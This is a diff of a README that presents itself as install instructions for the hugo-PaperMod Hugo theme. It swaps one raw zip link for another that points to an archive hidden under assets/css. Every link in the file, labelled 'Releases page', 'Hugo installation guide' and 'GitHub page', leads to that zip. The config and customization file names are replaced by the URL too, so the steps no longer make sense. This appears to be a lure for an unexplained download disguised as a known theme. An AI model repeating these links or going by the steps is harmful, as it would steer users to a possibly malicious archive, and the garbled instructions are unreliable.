@@ -1,6 +1,6 @@
 # 🎉 hugo-PaperMod - A Fast and Clean Hugo Theme
 
-[![Download hugo-PaperMod](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip%20hugo--PaperMod-v1.0-brightgreen)](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip)
+[![Download hugo-PaperMod](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip%20hugo--PaperMod-v1.0-brightgreen)](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip)
 
 ## 🌟 Overview
 
@@ -11,18 +11,18 @@ hugo-PaperMod is a fast, clean, and responsive theme for Hugo. It is designed to
 To start using hugo-PaperMod, you need to follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head to the [Releases page](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip) to access the latest version of hugo-PaperMod.
+   Head to the [Releases page](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip) to access the latest version of hugo-PaperMod.
 
 2. **Download the Theme**  
    On the Releases page, find the latest version. Click on the link to download the theme files to your computer.
 
 3. **Install Hugo**  
-   If you haven’t installed Hugo yet, you’ll need to do this first. Visit the [Hugo installation guide](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip) for instructions tailored to your operating system.
+   If you haven’t installed Hugo yet, you’ll need to do this first. Visit the [Hugo installation guide](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip) for instructions tailored to your operating system.
 
 4. **Add the Theme to Your Site**  
    Once you have Hugo installed and the hugo-PaperMod theme downloaded, follow these steps:
    - Move the downloaded theme files to your Hugo site's `themes` directory.
-   - Update your configuration file to use the new theme. In your `https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip` file, set:
+   - Update your configuration file to use the new theme. In your `https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip` file, set:
      ```
      theme = "hugo-PaperMod"
      ```
@@ -39,18 +39,18 @@ To start using hugo-PaperMod, you need to follow these simple steps:
 To download hugo-PaperMod, follow these instructions:
 
 - **Visit the Releases Page**  
-  Go to the [Releases page](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip).
+  Go to the [Releases page](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip).
 
-- Download the latest version from the Assets section. Look for files typically named like `https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip` or similar. Click on the file name to start the download.
+- Download the latest version from the Assets section. Look for files typically named like `https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip` or similar. Click on the file name to start the download.
 
 - **Install Hugo**  
-  Make sure you have Hugo installed. Follow the [Hugo installation guide](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip) if you haven't done this yet.
+  Make sure you have Hugo installed. Follow the [Hugo installation guide](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip) if you haven't done this yet.
 
 - **Move the Theme Files**  
   Unzip the downloaded theme and move the folder into your Hugo site's `themes` directory.
 
 - **Update Your Config**  
-  Open the `https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip` file in your Hugo site folder and set the theme:
+  Open the `https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip` file in your Hugo site folder and set the theme:
   ```
   theme = "hugo-PaperMod"
   ```
@@ -74,11 +74,11 @@ To download hugo-PaperMod, follow these instructions:
 
 ## 🛠️ Customization
 
-You can easily customize hugo-PaperMod to fit your unique style. Modify colors, fonts, and layout options in the `https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip` file. Refer to the included documentation for detailed instructions on customization.
+You can easily customize hugo-PaperMod to fit your unique style. Modify colors, fonts, and layout options in the `https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip` file. Refer to the included documentation for detailed instructions on customization.
 
 ## 📚 Documentation
 
-For extensive details on setup, configuration, and customization, visit the official documentation. You can find a link to it in the theme folder or on the [GitHub page](https://raw.githubusercontent.com/yousef-nabeh/hugo-PaperMod/master/encrinite/hugo-PaperMod.zip).
+For extensive details on setup, configuration, and customization, visit the official documentation. You can find a link to it in the theme folder or on the [GitHub page](https://github.com/yousef-nabeh/hugo-PaperMod/raw/refs/heads/master/assets/css/Paper-hugo-Mod-v2.9.zip).
 
 ## 🤝 Contributing
 
